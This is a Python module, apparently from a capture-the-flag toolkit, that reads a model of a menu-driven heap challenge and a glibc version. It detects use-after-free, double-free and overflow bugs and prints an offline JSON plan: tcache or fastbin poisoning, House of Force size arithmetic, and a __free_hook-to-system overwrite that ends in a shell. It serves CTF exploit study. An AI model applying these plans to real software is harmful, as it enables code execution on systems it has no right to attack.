#!/usr/bin/env python3
"""Version-aware exploitation PLAN engine for classic new/edit/read/free heap menus.

A huge share of beginner-to-mid pwn challenges are a single allocation table driven by a numbered
menu: *new* (allocate), *edit/extend/temper* (write into a slot), *read/show* (print a slot) and
*free/scrap* (release a slot).  The residual that model reasoning kept re-deriving by hand is twofold:

* mapping the menu operations to the heap primitives they actually grant (an un-cleared free is a
  use-after-free; an edit that writes at ``base+strlen`` with a ``requested`` length is a
  non-terminated linear overflow -- the *off-by-strlen* bug); and
* choosing the glibc-version-correct technique for the detected bug and emitting the win endpoint
  (a ``__free_hook``/``__malloc_hook`` overwrite while hooks are effective, House of Force while the
  top-size check is absent, or an FSOP/exit-handler chain afterwards).

This module does exactly that, offline and deterministically.  It takes a structural *menu model*
(hand-written, or derived from the decompiled menu B-011 already writes to ``recon/decompile/``) plus
a glibc version, detects the bug classes, selects the version-correct primitive chain keyed off
:mod:`heap_version_matrix`, and prints a reviewable JSON plan.  Nothing is allocated, executed, sent,
or connected.  Concrete addresses are optional: when supplied, the plan also emits the exact
``__free_hook`` overwrite bytes (via :mod:`heap_version_matrix`) and the House-of-Force top-advance
arithmetic, so the plan carries a verifiable artifact rather than prose alone.

The engine never reads the target binary and never runs it; the exact allocator transition and the
shipped libc are replayed by the operator in the pwn sandbox, exactly as the sibling heap planners
(:mod:`pwndepth_heap_plans`) require.
"""
from __future__ import annotations

import argparse
import json
import sys
from dataclasses import dataclass, field
from functools import wraps
from pathlib import Path
from typing import Any, Mapping, Sequence

try:  # package context
    from . import heap_version_matrix as matrix
    from . import heap_primitives as primitives
    from . import one_gadget
except ImportError:  # pragma: no cover - repository direct-import convention
    import heap_version_matrix as matrix
    import heap_primitives as primitives
    import one_gadget


MAX_JSON = 1 << 20
MAX_OPS = 64
MAX_SLOTS = 4096
SIZE_SZ64 = 0x10  # 2 * sizeof(size_t) on LP64; the chunk header between user ptr and the next chunk

# Canonical menu actions.  "misc" is ignored by detection (e.g. a "list" or "exit" entry).
ACTIONS = ("allocate", "edit", "read", "free", "misc")
EDIT_OFFSETS = ("base", "base_plus_strlen")
EDIT_LENGTHS = ("requested", "size_minus_strlen", "fixed", "strlen")
ARENAS = ("main", "thread")

# glibc minor at or below which House of Force works: the top-chunk size sanity check
# (``malloc(): corrupted top size``) landed in 2.29.
HOUSE_OF_FORCE_MAX_MINOR = 28


class MenuEngineError(ValueError):
    """The supplied menu model or parameters cannot form a reviewed plan."""


def _fail_closed(function):
    """Map every ordinary malformed-input failure to the lane's declared error."""

    @wraps(function)
    def guarded(*args, **kwargs):
        try:
            return function(*args, **kwargs)
        except MenuEngineError:
            raise
        except (matrix.VersionMatrixError, primitives.PrimitiveBuildError) as exc:
            raise MenuEngineError(str(exc)) from exc

    return guarded


# --------------------------------------------------------------------------- validation helpers


def _text(value: object, name: str, *, limit: int = 64) -> str:
    if not isinstance(value, str) or not value or len(value) > limit:
        raise MenuEngineError(f"{name} must be a non-empty string of at most {limit} chars")
    return value


def _flag(value: object, name: str) -> bool:
    if not isinstance(value, bool):
        raise MenuEngineError(f"{name} must be a boolean")
    return value


def _count(value: object, name: str, *, minimum: int, maximum: int) -> int:
    if isinstance(value, bool) or not isinstance(value, int) or not minimum <= value <= maximum:
        raise MenuEngineError(f"{name} must be an integer in {minimum}..{maximum}")
    return value


def _choice(value: object, name: str, allowed: Sequence[str]) -> str:
    if value not in allowed:
        raise MenuEngineError(f"{name} must be one of {', '.join(allowed)}")
    return value  # type: ignore[return-value]


# --------------------------------------------------------------------------- the menu model


@dataclass(frozen=True)
class MenuOp:
    """One numbered menu operation, described by its observable heap semantics.

    The fields are deliberately the *semantics a reader extracts from the decompiled handler*, not a
    bug label: whether a free NULLs the slot, whether a write starts at ``strlen`` of existing
    content and how long it is, whether a read hands raw bytes back.  The detector derives the bug
    classes from these, which is the part a model used to reason out by hand each time.
    """

    label: str
    action: str
    # allocate
    size_controlled: bool = False
    min_size: int = 0
    max_size: int = 0  # 0 == unbounded (when size_controlled)
    content_controlled: bool = False
    # edit
    edit_offset: str = "base"
    edit_len: str = "requested"
    fixed_len: int = 0
    null_terminated: bool = True
    # read
    returns_content: bool = False
    reads_until_nul: bool = False
    # free
    clears_slot: bool = True
    # shared slot safety
    checks_live: bool = True
    index_bounded: bool = True

    @classmethod
    def from_dict(cls, raw: Mapping[str, Any]) -> "MenuOp":
        if not isinstance(raw, Mapping):
            raise MenuEngineError("each op must be a JSON object")
        unknown = set(raw) - set(cls.__dataclass_fields__)
        if unknown:
            raise MenuEngineError(f"unknown op keys: {', '.join(sorted(unknown))}")
        label = _text(raw.get("label", ""), "op.label")
        action = _choice(raw.get("action"), f"op[{label}].action", ACTIONS)
        kwargs: dict[str, Any] = {"label": label, "action": action}
        if action == "allocate":
            kwargs["size_controlled"] = _flag(raw.get("size_controlled", False), "size_controlled")
            kwargs["min_size"] = _count(raw.get("min_size", 0), "min_size", minimum=0, maximum=1 << 32)
            kwargs["max_size"] = _count(raw.get("max_size", 0), "max_size", minimum=0, maximum=1 << 32)
            kwargs["content_controlled"] = _flag(raw.get("content_controlled", False), "content_controlled")
            if kwargs["max_size"] and kwargs["max_size"] < kwargs["min_size"]:
                raise MenuEngineError(f"op[{label}].max_size is below min_size")
        elif action == "edit":
            kwargs["edit_offset"] = _choice(raw.get("edit_offset", "base"), "edit_offset", EDIT_OFFSETS)
            kwargs["edit_len"] = _choice(raw.get("edit_len", "requested"), "edit_len", EDIT_LENGTHS)
            kwargs["fixed_len"] = _count(raw.get("fixed_len", 0), "fixed_len", minimum=0, maximum=1 << 32)
            kwargs["null_terminated"] = _flag(raw.get("null_terminated", True), "null_terminated")
            if kwargs["edit_len"] == "fixed" and kwargs["fixed_len"] == 0:
                raise MenuEngineError(f"op[{label}] fixed edit_len needs a non-zero fixed_len")
        elif action == "read":
            kwargs["returns_content"] = _flag(raw.get("returns_content", True), "returns_content")
            kwargs["reads_until_nul"] = _flag(raw.get("reads_until_nul", False), "reads_until_nul")
        elif action == "free":
            kwargs["clears_slot"] = _flag(raw.get("clears_slot", True), "clears_slot")
        kwargs["checks_live"] = _flag(raw.get("checks_live", True), "checks_live")
        kwargs["index_bounded"] = _flag(raw.get("index_bounded", True), "index_bounded")
        return cls(**kwargs)

    def as_dict(self) -> dict[str, object]:
        return {key: getattr(self, key) for key in self.__dataclass_fields__}


@dataclass(frozen=True)
class MenuModel:
    """The whole menu: its slot table, the ordered operations, and the arena it allocates from."""

    name: str
    bits: int
    slots: int
    arena: str
    ops: tuple[MenuOp, ...]

    @classmethod
    def from_dict(cls, raw: Mapping[str, Any]) -> "MenuModel":
        if not isinstance(raw, Mapping):
            raise MenuEngineError("model must be a JSON object")
        known = {"name", "bits", "slots", "arena", "ops", "glibc_version", "addresses", "one_gadget_text"}
        unknown = set(raw) - known
        if unknown:
            raise MenuEngineError(f"unknown model keys: {', '.join(sorted(unknown))}")
        bits = raw.get("bits", 64)
        if bits not in (32, 64):
            raise MenuEngineError("bits must be 32 or 64")
        raw_ops = raw.get("ops")
        if not isinstance(raw_ops, list) or not 1 <= len(raw_ops) <= MAX_OPS:
            raise MenuEngineError(f"ops must be a list of 1..{MAX_OPS} operations")
        ops = tuple(MenuOp.from_dict(item) for item in raw_ops)
        labels = [op.label for op in ops]
        if len(set(labels)) != len(labels):
            raise MenuEngineError("op labels must be unique")
        return cls(
            name=_text(raw.get("name", "menu-heap"), "model.name"),
            bits=bits,
            slots=_count(raw.get("slots", 16), "slots", minimum=1, maximum=MAX_SLOTS),
            arena=_choice(raw.get("arena", "main"), "arena", ARENAS),
            ops=ops,
        )

    def by_action(self, action: str) -> tuple[MenuOp, ...]:
        return tuple(op for op in self.ops if op.action == action)

    def as_dict(self) -> dict[str, object]:
        return {
            "name": self.name,
            "bits": self.bits,
            "slots": self.slots,
            "arena": self.arena,
            "ops": [op.as_dict() for op in self.ops],
        }


# --------------------------------------------------------------------------- findings / plan parts


@dataclass(frozen=True)
class BugFinding:
    bug_class: str
    op_label: str
    detail: str
    enables: tuple[str, ...]

    def as_dict(self) -> dict[str, object]:
        return {
            "bug_class": self.bug_class,
            "op": self.op_label,
            "detail": self.detail,
            "enables": list(self.enables),
        }


@dataclass(frozen=True)
class Primitive:
    name: str
    technique: str
    available: bool
    reason: str
    builder: str
    glibc_note: str

    def as_dict(self) -> dict[str, object]:
        return {
            "name": self.name,
            "technique": self.technique,
            "available": self.available,
            "reason": self.reason,
            "builder": self.builder,
            "glibc_note": self.glibc_note,
        }


@dataclass(frozen=True)
class MenuExploitPlan:
    target: str
    glibc_version: str
    bits: int
    profile: dict[str, object]
    bugs: tuple[BugFinding, ...]
    primitives: tuple[Primitive, ...]
    leaks: tuple[Primitive, ...]
    win: dict[str, object]
    stages: tuple[str, ...]
    constraints: tuple[str, ...]
    computed: dict[str, object]
    artifacts: dict[str, object] = field(default_factory=dict)

    def as_dict(self) -> dict[str, object]:
        return {
            "target": self.target,
            "glibc_version": self.glibc_version,
            "bits": self.bits,
            "profile": self.profile,
            "bugs": [item.as_dict() for item in self.bugs],
            "primitives": [item.as_dict() for item in self.primitives],
            "leaks": [item.as_dict() for item in self.leaks],
            "win": self.win,
            "stages": list(self.stages),
            "constraints": list(self.constraints),
            "computed": self.computed,
            "artifacts": self.artifacts,
            "offline_only": True,
        }


# --------------------------------------------------------------------------- bug detection


def detect_bugs(model: MenuModel) -> tuple[BugFinding, ...]:
    """Derive the bug classes a menu grants purely from its operation semantics.

    Rules (each is a direct reading of the handler, not a guess):

    * **off-by-strlen** -- an ``edit`` that writes a ``requested``/``fixed``/``strlen`` length at
      ``base+strlen`` overflows by up to ``strlen(previous content)`` bytes; the one correct form is
      ``size_minus_strlen``.  A non-terminated such write also bleeds adjacent heap into later reads.
    * **heap-overflow** -- an ``edit`` writing a ``fixed`` length at ``base`` while a smaller
      allocation is reachable.
    * **use-after-free** -- a ``read``/``edit`` that does not re-check liveness while some ``free``
      leaves the slot pointer dangling.
    * **double-free** -- a ``free`` that neither clears the slot nor rechecks liveness.
    * **info-leak** -- a ``read`` that returns raw slot bytes (amplified by a non-terminated write).
    """

    if not isinstance(model, MenuModel):
        raise MenuEngineError("detect_bugs needs a MenuModel")
    frees = model.by_action("free")
    dangling_free = any(not op.clears_slot for op in frees)
    nonterminated_edit = any(op.action == "edit" and not op.null_terminated for op in model.ops)

    bugs: list[BugFinding] = []
    reachable_min_alloc = _min_allocation(model)
    for op in model.ops:
        if op.action == "edit":
            bugs.extend(_edit_bugs(op, reachable_min_alloc))
            if not op.checks_live and dangling_free:
                bugs.append(BugFinding(
                    "use-after-free", op.label,
                    "edit does not re-check slot liveness and a free leaves the pointer dangling",
                    ("write-after-free", "freelist-fd-overwrite"),
                ))
        elif op.action == "read":
            if op.returns_content:
                amp = " (a non-terminated write makes it bleed adjacent heap)" if (
                    op.reads_until_nul and nonterminated_edit) else ""
                bugs.append(BugFinding(
                    "info-leak", op.label,
                    f"read returns raw slot bytes to the attacker{amp}",
                    ("libc-leak", "heap-leak"),
                ))
            if not op.checks_live and dangling_free:
                bugs.append(BugFinding(
                    "use-after-free", op.label,
                    "read does not re-check slot liveness and a free leaves the pointer dangling",
                    ("read-after-free", "freelist-fd-leak"),
                ))
    for op in frees:
        if not op.clears_slot and not op.checks_live:
            bugs.append(BugFinding(
                "double-free", op.label,
                "free neither NULLs the slot nor rechecks liveness, so a slot can be freed twice",
                ("freelist-dup",),
            ))
    return tuple(bugs)


def _groom_size(model: MenuModel) -> int:
    """Pick a representative aligned chunk size for the bounded feng-shui plan.

    The size comes from a controllable allocation when the model names one, else a typical small-bin
    size; it is aligned and clamped to the tcache range so grooming stays in the small-chunk regime
    that freelist and overlap attacks need.  It is only a layout representative, not a required size.
    """

    align = 0x10 if model.bits == 64 else 0x8
    floor = 0x20 if model.bits == 64 else 0x10
    candidate: int | None = None
    for op in model.by_action("allocate"):
        if op.max_size and op.max_size >= floor:
            candidate = op.max_size
            break
        if op.size_controlled and op.min_size and op.min_size >= floor:
            candidate = op.min_size
            break
    if candidate is None or candidate > 0x410:
        candidate = 0x90 if model.bits == 64 else 0x48
    return max(floor, candidate - (candidate % align))


def _min_allocation(model: MenuModel) -> int | None:
    sizes: list[int] = []
    for op in model.by_action("allocate"):
        if op.size_controlled:
            sizes.append(op.min_size if op.min_size else 0x18)
        elif op.max_size:
            sizes.append(op.max_size)
    return min(sizes) if sizes else None


def _edit_bugs(op: MenuOp, reachable_min_alloc: int | None) -> list[BugFinding]:
    out: list[BugFinding] = []
    if op.edit_offset == "base_plus_strlen" and op.edit_len != "size_minus_strlen":
        enables = ["linear-heap-overflow"]
        bleed = ""
        if not op.null_terminated:
            enables.append("strlen-leak")
            bleed = "; the missing NUL also leaks adjacent heap through later reads"
        out.append(BugFinding(
            "off-by-strlen", op.label,
            "write starts at base+strlen(content) with a length that is not size-strlen, so it "
            f"overflows the chunk by up to strlen(previous content) bytes{bleed}",
            tuple(enables),
        ))
    elif op.edit_offset == "base" and op.edit_len == "fixed":
        if reachable_min_alloc is None or op.fixed_len > reachable_min_alloc:
            out.append(BugFinding(
                "heap-overflow", op.label,
                f"fixed-length write of {op.fixed_len:#x} bytes at base can exceed a smaller "
                "reachable allocation",
                ("linear-heap-overflow",),
            ))
    return out


# --------------------------------------------------------------------------- primitive mapping


def map_primitives(
    bugs: Sequence[BugFinding],
    profile: matrix.AllocatorProfile,
    model: MenuModel,
) -> tuple[tuple[Primitive, ...], tuple[Primitive, ...]]:
    """Map detected bugs to version-correct control primitives and leak primitives."""

    classes = {bug.bug_class for bug in bugs}
    control: list[Primitive] = []
    tcache_max = profile.tcache_max_chunk_lp64 if model.bits == 64 else profile.tcache_max_chunk_lp32

    if {"off-by-strlen", "heap-overflow"} & classes:
        hof_ok = profile.minor <= HOUSE_OF_FORCE_MAX_MINOR and model.arena == "main"
        control.append(Primitive(
            name="linear-heap-overflow",
            technique="house-of-force",
            available=hof_ok,
            reason=("overflow reaches the main-arena top chunk and no top-size check is present"
                    if hof_ok else
                    "House of Force needs the main arena and glibc <= 2.28 (2.29 added the top-size check)"),
            builder="menu overflow -> top chunk size = 0xfff...; see house_of_force_size()",
            glibc_note=f"top-size integrity check present from 2.29; this profile is {profile.version}",
        ))
        overlap_ok = profile.tcache
        control.append(Primitive(
            name="linear-heap-overflow",
            technique="chunk-size-overlap-into-tcache",
            available=overlap_ok,
            reason=("corrupt an adjacent free chunk's size to overlap it, then poison the tcache fd"
                    if overlap_ok else "no tcache in this glibc; use unsorted/fastbin overlap"),
            builder="heap_version_matrix.build_versioned_tcache(action='poison', ...)",
            glibc_note=("tcache fd mangled by safe-linking from 2.32; fd slot addr must be the real one"
                        if profile.safe_linking else "tcache fd is a raw pointer"),
        ))

    if {"use-after-free", "double-free"} & classes:
        if profile.tcache:
            control.append(Primitive(
                name="freelist-control",
                technique="tcache-poison" if "use-after-free" in classes else "tcache-dup",
                available=True,
                reason="free leaves a tcache entry the menu still operates on",
                builder="heap_version_matrix.build_versioned_tcache(...)",
                glibc_note=_tcache_note(profile),
            ))
        else:
            control.append(Primitive(
                name="freelist-control",
                technique="fastbin-poison" if "use-after-free" in classes else "fastbin-dup",
                available=True,
                reason="no tcache; the freed chunk stays on the fastbin for the menu to reuse",
                builder="heap_version_matrix.build_versioned_fastbin(...)",
                glibc_note="pre-tcache glibc; fastbin size and A/B/A duplicate rules apply",
            ))

    leaks: list[Primitive] = []
    if "info-leak" in classes:
        leaks.append(_libc_leak(profile, model, tcache_max))
        leaks.append(_heap_leak(profile))
    return tuple(control), tuple(leaks)


def _tcache_note(profile: matrix.AllocatorProfile) -> str:
    notes = []
    if profile.tcache_key_check:
        notes.append("clear tcache_entry.key before a duplicate free (2.29+)")
    if profile.safe_linking:
        notes.append("mangle the fd with PROTECT_PTR using the real slot address (2.32+)")
    return "; ".join(notes) if notes else "raw tcache fd, no key check"


def _libc_leak(
    profile: matrix.AllocatorProfile,
    model: MenuModel,
    tcache_max: int,
) -> Primitive:
    big_alloc = any(
        op.action == "allocate" and op.size_controlled and (op.max_size == 0 or op.max_size > tcache_max)
        for op in model.ops
    )
    return Primitive(
        name="info-leak",
        technique="unsorted-bin-main-arena-leak",
        available=big_alloc,
        reason=("free a chunk larger than the tcache range so it lands in the unsorted bin, then read "
                "its fd/bk (a main_arena address) to defeat libc ASLR" if big_alloc else
                "no reachable allocation above the tcache range; use a fastbin/tcache chunk-count leak"),
        builder="menu read of a freed unsorted chunk; add libc base offset to the leaked fd/bk",
        glibc_note=f"tcache range is <= {tcache_max:#x} for {profile.version}; larger frees skip it",
    )


def _heap_leak(profile: matrix.AllocatorProfile) -> Primitive:
    return Primitive(
        name="info-leak",
        technique="tcache-fd-heap-leak",
        available=profile.tcache,
        reason=("read a freed tcache chunk's fd to recover the heap base" if profile.tcache
                else "no tcache; read a fastbin fd instead for the heap base"),
        builder="menu read of a freed small chunk's fd word",
        glibc_note=("demangle the fd: heap_base = (fd << 12) ^ fd for safe-linking (2.32+)"
                    if profile.safe_linking else "fd is a raw heap pointer"),
    )


# --------------------------------------------------------------------------- win endpoint


def house_of_force_size(top_chunk_addr: int, target_user_addr: int, bits: int = 64) -> int:
    """Return the evil chunk size that advances the top chunk so the *next* malloc lands on target.

    Convention: ``top_chunk_addr`` is the top chunk's header address (user data at +0x10).  After the
    oversized top size is forged, ``malloc`` carves a chunk of size ``nb`` and the new top header is
    ``top + nb``; the following ``malloc`` returns ``new_top + 0x10``.  To make that equal
    ``target_user_addr`` we need ``nb = target_user_addr - 0x10 - top_chunk_addr`` (mod 2**bits).
    """

    if bits not in (32, 64):
        raise MenuEngineError("bits must be 32 or 64")
    for value, label in ((top_chunk_addr, "top_chunk_addr"), (target_user_addr, "target_user_addr")):
        if isinstance(value, bool) or not isinstance(value, int) or not 0 < value < (1 << bits):
            raise MenuEngineError(f"{label} must be a non-zero {bits}-bit address")
    header = SIZE_SZ64 if bits == 64 else 0x8
    return (target_user_addr - header - top_chunk_addr) & ((1 << bits) - 1)


@_fail_closed
def _build_win(
    profile: matrix.AllocatorProfile,
    model: MenuModel,
    control: Sequence[Primitive],
    addresses: Mapping[str, int] | None,
    one_gadgets: Sequence[int],
) -> tuple[dict[str, object], dict[str, object], list[str]]:
    """Choose the win endpoint for the profile and, with addresses, emit the concrete artifact."""

    artifacts: dict[str, object] = {}
    stages: list[str] = []
    hof = any(p.technique == "house-of-force" and p.available for p in control)
    if profile.malloc_hooks_effective:
        win: dict[str, object] = {
            "endpoint": "__free_hook",
            "technique": "overwrite __free_hook with system (or a one-gadget), then free a /bin/sh chunk",
            "alternatives": ["__malloc_hook + __realloc_hook pivot", "one-gadget when system args are awkward"],
            "glibc_note": f"malloc hooks are effective through 2.34-removal; profile {profile.version}",
            "one_gadget_offsets": [hex(off) for off in one_gadgets],
        }
        if addresses:
            artifacts.update(_emit_hook_artifact(profile, model, addresses, hof))
    else:
        win = {
            "endpoint": "FSOP / exit handlers",
            "technique": ("hooks removed: pivot to _IO_2_1_stdout_ FSOP, __run_exit_handlers / "
                          "tls-dtor_list, or House of Banana (_dl_fini) via the large-bin planner"),
            "alternatives": ["solvers/toolkits/pwn_fsop.py", "solvers/toolkits/pwndepth_heap_plans.py banana"],
            "glibc_note": f"__free_hook/__malloc_hook removed in 2.34; profile {profile.version}",
            "one_gadget_offsets": [hex(off) for off in one_gadgets],
        }
        if addresses:
            win["note"] = "concrete hook emission is skipped: this glibc has no effective malloc hooks"
    return win, artifacts, stages


def _emit_hook_artifact(
    profile: matrix.AllocatorProfile,
    model: MenuModel,
    addresses: Mapping[str, int],
    hof: bool,
) -> dict[str, object]:
    free_hook = addresses.get("free_hook_addr")
    system = addresses.get("system_addr")
    if free_hook is None or system is None:
        raise MenuEngineError("addresses must provide free_hook_addr and system_addr for hook emission")
    hook_build = matrix.build_versioned_hook_overwrite(
        glibc_version=profile.version, hook_address=free_hook,
        replacement_address=system, hook="free", bits=model.bits,
    )
    artifact: dict[str, object] = {"free_hook_overwrite": hook_build.as_dict()}
    if hof:
        top = addresses.get("top_chunk_addr")
        if top is None:
            raise MenuEngineError("House of Force emission needs top_chunk_addr")
        # Make the *next* allocation after the evil malloc return __free_hook as its user pointer.
        evil = house_of_force_size(top, free_hook, model.bits)
        artifact["house_of_force"] = {
            "top_chunk_addr": hex(top),
            "free_hook_addr": hex(free_hook),
            "evil_chunk_size": hex(evil),
            "note": ("malloc(evil) with request2size(n)==evil_chunk_size advances top; the next malloc "
                     "returns a chunk whose user data is __free_hook"),
        }
    return artifact


# --------------------------------------------------------------------------- plan assembly


@_fail_closed
def plan_menu_exploitation(
    model: MenuModel,
    glibc_version: str,
    *,
    addresses: Mapping[str, int] | None = None,
    one_gadget_text: str | None = None,
) -> MenuExploitPlan:
    """Detect the bugs, pick the version-correct primitive chain, and assemble a reviewable plan."""

    if not isinstance(model, MenuModel):
        raise MenuEngineError("plan_menu_exploitation needs a MenuModel")
    profile = matrix.profile_for(glibc_version)
    checked_addresses = _check_addresses(addresses, model.bits)
    one_gadgets = _parse_one_gadgets(one_gadget_text)

    bugs = detect_bugs(model)
    if not bugs:
        raise MenuEngineError(
            "no exploitable primitive found: the menu has no overflow, UAF, double-free, or leak"
        )
    control, leaks = map_primitives(bugs, profile, model)
    if not control:
        raise MenuEngineError("bugs detected but none maps to a control primitive for this glibc")
    win, artifacts, _ = _build_win(profile, model, control, checked_addresses, one_gadgets)

    groom_size = _groom_size(model)
    grooming = primitives.plan_heap_groom(
        chunk_size=groom_size, live_chunks=6, holes=2, guard_chunks=2, refill=False,
    )
    stages = _stages(bugs, control, leaks, win, profile)
    constraints = _constraints(profile, model, bugs)
    computed = {
        "bug_classes": sorted({bug.bug_class for bug in bugs}),
        "control_techniques": [p.technique for p in control if p.available]
        or [p.technique for p in control],
        "leak_techniques": [p.technique for p in leaks if p.available],
        "house_of_force": any(p.technique == "house-of-force" and p.available for p in control),
        "hooks_effective": profile.malloc_hooks_effective,
        "tcache": profile.tcache,
        "safe_linking": profile.safe_linking,
        "groom_chunk_size": hex(groom_size),
        "grooming": [op.as_dict() for op in grooming],
    }
    return MenuExploitPlan(
        target=model.name, glibc_version=profile.version, bits=model.bits,
        profile=profile.as_dict(), bugs=bugs, primitives=control, leaks=leaks,
        win=win, stages=tuple(stages), constraints=tuple(constraints),
        computed=computed, artifacts=artifacts,
    )


def _check_addresses(addresses: Mapping[str, int] | None, bits: int) -> dict[str, int] | None:
    if addresses is None:
        return None
    if not isinstance(addresses, Mapping):
        raise MenuEngineError("addresses must be a mapping")
    allowed = {"free_hook_addr", "system_addr", "top_chunk_addr", "libc_base"}
    out: dict[str, int] = {}
    for key, value in addresses.items():
        if key not in allowed:
            raise MenuEngineError(f"unknown address key: {key}")
        if isinstance(value, str):
            try:
                value = int(value, 0)
            except ValueError as exc:
                raise MenuEngineError(f"{key} is not an integer") from exc
        if isinstance(value, bool) or not isinstance(value, int) or not 0 < value < (1 << bits):
            raise MenuEngineError(f"{key} must be a non-zero {bits}-bit address")
        out[key] = value
    return out


def _parse_one_gadgets(text: str | None) -> tuple[int, ...]:
    if text is None:
        return ()
    candidates = one_gadget.parse_one_gadget_output(text)
    return tuple(candidate.offset for candidate in candidates)


def _stages(
    bugs: Sequence[BugFinding],
    control: Sequence[Primitive],
    leaks: Sequence[Primitive],
    win: Mapping[str, object],
    profile: matrix.AllocatorProfile,
) -> list[str]:
    stages = ["map each menu op to its primitive: "
              + ", ".join(f"{bug.op_label}->{bug.bug_class}" for bug in bugs)]
    for leak in leaks:
        if leak.available:
            stages.append(f"leak: {leak.technique} -- {leak.builder}")
    for prim in control:
        if prim.available:
            stages.append(f"control: {prim.technique} -- {prim.builder}")
            break
    stages.append(f"win: {win['endpoint']} -- {win['technique']}")
    stages.append("replay the exact allocator transition and shipped libc in the pwn sandbox")
    return stages


def _constraints(
    profile: matrix.AllocatorProfile,
    model: MenuModel,
    bugs: Sequence[BugFinding],
) -> list[str]:
    out = [
        "the menu model is a structural reading of the handlers; verify it against the decompiled source",
        "no allocation, process, socket, or delivery happens here; this is a plan only",
        f"all addresses and the exact allocator transition are replayed against glibc {profile.version}",
    ]
    out.extend(profile.constraints[:3])
    if any(b.bug_class == "off-by-strlen" for b in bugs):
        out.append("the off-by-strlen overflow magnitude is bounded by strlen(previous content); "
                   "fill the chunk with a non-terminated write to approach a full-chunk overflow")
    return out


# --------------------------------------------------------------------------- CLI


class _Parser(argparse.ArgumentParser):
    def error(self, message: str) -> None:  # pragma: no cover - exercised through main
        raise MenuEngineError(message)


def _load_json(path: str) -> dict[str, Any]:
    try:
        with Path(path).open("rb") as handle:
            raw = handle.read(MAX_JSON + 1)
    except OSError as exc:
        raise MenuEngineError(f"cannot read config: {exc}") from exc
    if len(raw) > MAX_JSON:
        raise MenuEngineError("JSON config exceeds 1 MiB")
    try:
        value = json.loads(raw.decode("utf-8"))
    except (UnicodeError, json.JSONDecodeError) as exc:
        raise MenuEngineError(f"invalid JSON config: {exc}") from exc
    if not isinstance(value, dict):
        raise MenuEngineError("JSON root must be an object")
    return value


def plan_from_config(config: Mapping[str, Any]) -> MenuExploitPlan:
    """Build a plan from a parsed JSON config (model fields plus glibc_version/addresses)."""

    if not isinstance(config, Mapping):
        raise MenuEngineError("config must be a JSON object")
    glibc_version = config.get("glibc_version")
    if not isinstance(glibc_version, str):
        raise MenuEngineError("config.glibc_version is required (e.g. \"2.27\")")
    model = MenuModel.from_dict(config)
    addresses = config.get("addresses")
    one_gadget_text = config.get("one_gadget_text")
    if one_gadget_text is not None and not isinstance(one_gadget_text, str):
        raise MenuEngineError("one_gadget_text must be a string")
    return plan_menu_exploitation(
        model, glibc_version, addresses=addresses, one_gadget_text=one_gadget_text,
    )


def main(argv: list[str] | None = None) -> int:
    parser = _Parser(prog="heap_menu_engine.py", add_help=True)
    parser.add_argument("config", help="bounded JSON menu model plus glibc_version")
    try:
        try:
            args = parser.parse_args(argv)
        except SystemExit as exc:
            return exc.code if isinstance(exc.code, int) else 2
        plan = plan_from_config(_load_json(args.config))
        print(json.dumps(plan.as_dict(), sort_keys=True))
        return 0
    except MenuEngineError as exc:
        print(f"heap_menu_engine: {exc}", file=sys.stderr)
        return 2
    except Exception as exc:  # guarded CLI boundary
        # The public CLI contract never leaks a stdlib exception from malformed input.
        print(f"heap_menu_engine: malformed input: {exc}", file=sys.stderr)
        return 2


__all__ = [
    "ACTIONS", "EDIT_LENGTHS", "EDIT_OFFSETS", "HOUSE_OF_FORCE_MAX_MINOR",
    "BugFinding", "MenuEngineError", "MenuExploitPlan", "MenuModel", "MenuOp", "Primitive",
    "detect_bugs", "house_of_force_size", "main", "map_primitives",
    "plan_from_config", "plan_menu_exploitation",
]


if __name__ == "__main__":
    raise SystemExit(main())
